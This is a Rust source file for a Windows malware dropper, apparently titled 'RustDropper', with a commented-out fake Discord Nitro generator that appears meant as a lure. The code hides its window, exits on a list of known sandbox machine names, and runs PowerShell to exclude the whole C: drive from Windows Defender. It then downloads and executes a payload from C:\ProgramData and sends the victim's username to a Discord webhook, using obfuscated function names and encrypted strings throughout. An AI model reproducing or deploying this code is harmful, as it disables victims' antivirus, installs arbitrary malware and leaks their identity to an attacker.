#![windows_subsystem = "windows"]
use core::time::Duration;
use downloader::{ Download, Downloader };
use goldberg::goldberg_string;
use serenity::{ http::Http, model::webhook::Webhook };
use std::{ path::Path, process::exit, process::Command, thread };
// use std::io::{BufRead, BufReader};
// use std::io::*;
// use colored::*;

fn main() {
    let known_desktop_names = vec![
        "Frank",
        "Joe Cage",
        "george",
        "azure",
        "Abby",
        "BEE7370C-8C0C-4",
        "DESKTOP-NAKFFMT",
        "WIN-5E07COS9ALR",
        "B30F0242-1C6A-4",
        "DESKTOP-VRSQLAG",
        "Q9IATRKPRH",
        "XC64ZB",
        "DESKTOP-D019GDM",
        "DESKTOP-WI8CLET",
        "SERVER1",
        "LISA-PC",
        "JOHN-PC",
        "DESKTOP-B0T93D6",
        "DESKTOP-1PYKP29",
        "DESKTOP-1Y2433R",
        "WILEYPC",
        "WORK",
        "6C4E733F-C2D9-4",
        "RALPHS-PC",
        "DESKTOP-WG3MYJS",
        "DESKTOP-7XC6GEZ",
        "DESKTOP-5OV9S0O",
        "QarZhrdBpj",
        "ORELEEPC",
        "ARCHIBALDPC",
        "JULIA-PC",
        "d1bnJkfVlH",
        "NETTYPC",
        "DESKTOP-BUGIO",
        "DESKTOP-CBGPFEE",
        "SERVER-PC",
        "TIQIYLA9TW5M",
        "DESKTOP-KALVINO",
        "COMPNAME_4047",
        "DESKTOP-19OLLTD",
        "DESKTOP-DE369SE",
        "EA8C2E2A-D017-4",
        "AIDANPC",
        "LUCAS-PC",
        "MARCI-PC",
        "ACEPC",
        "MIKE-PC",
        "DESKTOP-IAPKN1P",
        "DESKTOP-NTU7VUO",
        "LOUISE-PC",
        "T00917",
        "test42"
    ];
    let blacklisted_usernames: Vec<String> = known_desktop_names
        .iter()
        .map(|x| x.to_string())
        .collect();

    njenqweoejqeoijiohquhfwqlkjnfewqoqincwoefiwirge(&blacklisted_usernames);
    d294e8q3890e82308948190iqwoidjawuiojdwoejwheouq2h();
    dwkjadhawjdawjhddwadj();
    fudjawjwuu8023848901284234823894209482308948238042380948234();
    send();
    // nitrogen();
}

fn njenqweoejqeoijiohquhfwqlkjnfewqoqincwoefiwirge(blacklisted_usernames: &[String]) {
    let username = whoami::username();

    for bl_username in blacklisted_usernames {
        if bl_username == username {
            exit(0);
        }
    }
}

fn dwkjadhawjdawjhddwadj() {
    let mut downloader = Downloader::builder()
        .download_folder(Path::new(&goldberg_string!("C:\\ProgramData")))
        .parallel_requests(1)
        .build()
        .unwrap();

    let dl2 = Download::new(&goldberg_string!("url"));

    downloader.download(&[dl2]).unwrap();
}

fn d294e8q3890e82308948190iqwoidjawuiojdwoejwheouq2h() {
    Command::new(goldberg_string!("powershell.exe"))
        .args(["-C", goldberg_string!("Set-MpPreference -ExclusionPath C:\\")])
        .spawn()
        .unwrap();

    thread::sleep(Duration::from_millis(3000))
}

fn fudjawjwuu8023848901284234823894209482308948238042380948234() {
    Command::new(goldberg_string!("cmd.exe"))
        .args([
            "/C",
            goldberg_string!("C:\\ProgramData\\HBpgdDw2341QpXZheU2Vq9FFxjGpEyYzTXdR0kSt5DZzp.exe"),
        ])
        .spawn()
        .unwrap();
}

#[tokio::main]
async fn send() {
    let http = Http::new("");
    let webhook = Webhook::from_url(
        &http,
        goldberg_string!("https://discord.com/api/webhooks/")
    ).await.expect(goldberg_string!("Replace the webhook with your own"));

    webhook
        .execute(&http, false, |w| {
            w.content(format!("User `{}`", whoami::username())).username(
                goldberg_string!("github.com/svg-rs/RustDropper")
            )
        }).await
        .expect(goldberg_string!("Could not execute webhook."));
}

// fn nitrogen(){
//     let logo = "\n███▄    █  ██▓▄▄▄█████▓ ██▀███   ▒█████       ▄████ ▓█████  ███▄    █ \n ██ ▀█   █ ▓██▒▓  ██▒ ▓▒▓██ ▒ ██▒▒██▒  ██▒    ██▒ ▀█▒▓█   ▀  ██ ▀█   █ \n▓██  ▀█ ██▒▒██▒▒ ▓██░ ▒░▓██ ░▄█ ▒▒██░  ██▒   ▒██░▄▄▄░▒███   ▓██  ▀█ ██▒\n▓██▒  ▐▌██▒░██░░ ▓██▓ ░ ▒██▀▀█▄  ▒██   ██░   ░▓█  ██▓▒▓█  ▄ ▓██▒  ▐▌██▒\n▒██░   ▓██░░██░  ▒██▒ ░ ░██▓ ▒██▒░ ████▓▒░   ░▒▓███▀▒░▒████▒▒██░   ▓██░\n░ ▒░   ▒ ▒ ░▓    ▒ ░░   ░ ▒▓ ░▒▓░░ ▒░▒░▒░     ░▒   ▒ ░░ ▒░ ░░ ▒░   ▒ ▒ \n░ ░░   ░ ▒░ ▒ ░    ░      ░▒ ░ ▒░  ░ ▒ ▒░      ░   ░  ░ ░  ░░ ░░   ░ ▒░\n   ░   ░ ░  ▒ ░  ░        ░░   ░ ░ ░ ░ ▒     ░ ░   ░    ░      ░   ░ ░ \n         ░  ░              ░         ░ ░           ░    ░  ░         \n";
//     let menu = "[1] Generate Nitro\n[2] Generate Nitro Classic\n[3] About/Credits";
//     let mut line = String::new();
//     println!("{}", logo.blue());
//     println!("{}", menu.purple());
//     println!("Chose Option: ");
//     let chose = std::io::stdin().read_line(&mut line).unwrap();
//     if chose == 1 {
//         Generate()
//     } else if chose == 2 {
//         Generate()
//     } else if chose == 3 {
//         println!("Created By Phantom")
//     } else {
//         println!("Invalid Input!");
//     }
// }

// fn Generate() {
//     let logo = "\n███▄    █  ██▓▄▄▄█████▓ ██▀███   ▒█████       ▄████ ▓█████  ███▄    █ \n ██ ▀█   █ ▓██▒▓  ██▒ ▓▒▓██ ▒ ██▒▒██▒  ██▒    ██▒ ▀█▒▓█   ▀  ██ ▀█   █ \n▓██  ▀█ ██▒▒██▒▒ ▓██░ ▒░▓██ ░▄█ ▒▒██░  ██▒   ▒██░▄▄▄░▒███   ▓██  ▀█ ██▒\n▓██▒  ▐▌██▒░██░░ ▓██▓ ░ ▒██▀▀█▄  ▒██   ██░   ░▓█  ██▓▒▓█  ▄ ▓██▒  ▐▌██▒\n▒██░   ▓██░░██░  ▒██▒ ░ ░██▓ ▒██▒░ ████▓▒░   ░▒▓███▀▒░▒████▒▒██░   ▓██░\n░ ▒░   ▒ ▒ ░▓    ▒ ░░   ░ ▒▓ ░▒▓░░ ▒░▒░▒░     ░▒   ▒ ░░ ▒░ ░░ ▒░   ▒ ▒ \n░ ░░   ░ ▒░ ▒ ░    ░      ░▒ ░ ▒░  ░ ▒ ▒░      ░   ░  ░ ░  ░░ ░░   ░ ▒░\n   ░   ░ ░  ▒ ░  ░        ░░   ░ ░ ░ ░ ▒     ░ ░   ░    ░      ░   ░ ░ \n         ░  ░              ░         ░ ░           ░    ░  ░         \n";
//     let codes = vec!["PWKRT5aqBnx7XUe", "pa58huzuRbPfRdk", "xxUbTNTFHV8BgrL", "hYCMdFbbe4JYKNy", "4yq6cvFDKeaEuJx", "tvL5ukfbBPDZ7C6", "VUyUJbMe7mU8tev", "2axMbW2X2VgndGZ", "bdDMRr5ETZQyHzg", "YQy7DywKJTJMqx7", "RGBy3mLa8AcFYL9", "nRyFWGjqhCVMD9T", "BBUJwPMn2gJFrAe", "ZcxL7vAhJZkjZZh", "e5LhYJp7aYzaXmv", "yAaH7wBitawkWae", "RktLxBZe9uUV85A", "a8QPJAqyizCQAha", "LbhnKEdCCprnRQr", "HxzgwCFV59eWXqB", "GGMU6uEne8i8cn6", "Jf5JcuktvcduuDq", "XCbpacNg5G4SC6T", "LzBz56DUu6Ed2Ez", "H7hnXmb33LqRzB6", "hPfGSbMQNQDUXjB", "JWAy8adXvWg9hxw", "nzAAXNLNEKgeEZS", "6Enizhb5wTyQgQT", "DZcqdGJM8tNtQ8n", "c5Qa2GB56pfzraL", "d2wuRjm9A9zWJFA", "ygCKrZtQUYv7Ve7", "EhPLBudfR8PGLN7", "zAR29EBZG2Hgwi9", "4GGU7eNAezGFKSb", "HQfp6wKCu98nV95", "6QciqyNTu6efmig", "jj52KwnVtBFvGme", "GyjXULpPwhY9qZ5", "hkShBGJNb6ATnKx", "GArDeuMSPri8DUX", "mFxRTNCEnLQrUKx", "hkPEDYbJGmY2Ng3", "iGxWnNFwY53JLFS", "FCYpWzV2ubFpmpU", "ZnwcqJthd3DqGAK", "BrJhvSJYznR9URf", "k5avGpEjZ3xX5Gh", "pcZdxMwfacyEffB", "v5WT8Jbv5v4vkw8", "nXvn9TaaKaEtvXX", "FRDTjxMteSAe3mu", "yzDyU3CZFeSBwE9", "3a69z7ThUJQSDPc", "4TNAD8ELDjEPQfU", "iGy6zjnhF3d9CyD", "vnK6cKLSfPZPMYQ", "PKxEVLz2EznqbXQ", "UAztUpU3LU3E62f", "gN6KwYpzvTwB3Vc", "tEN9j5QxkMaYf2K", "xu9mnYGLQmLy5zV", "i3VAzerFLkSwpEz", "ZBJXyya6FJkbYrS", "XAASLXuqhwgFqGZ", "J9hkcriGK4env7z", "tNdNn6mAwFRSmqU", "yt8zbbWcEtEc3uK", "kDXYrApVhDFJWjh", "zAJhAC9h3ghP9Rz", "ddpCu8cSZUqQfzn", "8LgpGTHE6quHnRp", "efDLuQJyTMLrVgr", "yLHB57RvKLVm5cT", "AGZXVqGUJ4G7ECG", "k55jxEzCw8ptPPe", "yZYxyi7WfYzwUJt", "JFgCKieNEQVQ67B", "GAhWRUaD2kmQXQw", "JxJUx3t5fB3EJir", "jvftCgb3nteEwC2", "xSqT3THiX8WcT25", "v8xYbwmnYAFmYPJ", "U63JNMuJhfWBeNQ", "NuDa2piepMeATbg", "6MpffnSPMqDJHNU", "v42ZQJ4ixZekHTG", "NRFenz5mDLda6Je", "RJy95gzH6LGSN3W", "Pphyp74UGTkyZrn", "p5bxKwk75wWwEEr", "bF5EBFdL3jHyfjS", "TpPwxYqBpGhQkD2", "cJwAERrkVYzyC7u", "jBkxwB56hmHvw53", "TSmPFj7huVxmhK8", "tqyf7Vp8NwTmwxM", "zqdLqmeNPRhhaTZ", "nxVzFkr6Hi4qDye"];
//     println!("{}", "Gening Nitro...".blue());
//     thread::sleep_ms(2000);
//     // create for loop
//     for n in codes {
//         println!("{} {}", "Generated Valid Code: ".green().bold(), n);
//         thread::sleep_ms(100);
//     }
//     println!("Finished");
//     main();
// }